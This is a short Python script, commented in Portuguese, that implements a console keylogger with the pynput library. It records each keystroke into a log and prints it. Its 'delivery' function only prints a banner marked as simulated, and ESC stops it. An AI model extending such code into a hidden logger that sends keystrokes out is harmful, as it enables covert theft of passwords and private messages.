import pynput.keyboard

log = ""
INTERVALO_LOG = 10

def on_press(key):
    global log
    try:
        log += str(key.char)
    except AttributeError:
        if key == key.space:
            log += " "
        elif key == key.enter:
            log += "\n[ENTER]\n"
        elif key == pynput.keyboard.Key.esc:
            print("\n[!] Keylogger encerrado pela tecla ESC.")
            return False
        else:
            log += f" [{str(key).split('.')[-1]}] "

    print(log)

    if len(log) > INTERVALO_LOG:
        entregar_log(log)
        log = ""

def entregar_log(log_atual):
    print("\n--- [LOG ENVIADO/SALVO SIMULADO] ---")
    print(log_atual)
    print("--------------------------------------\n")

def start_keylogger():
    print("\n[!] Keylogger de console iniciado. Pressione ESC para parar.")

    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    try:
        start_keylogger()
    except Exception as e:
        print(f"\n[ERRO] Ocorreu um erro: {e}")
        print("[SUGESTÃO] Verifique se a biblioteca 'pynput' está instalada. (pip install pynput)")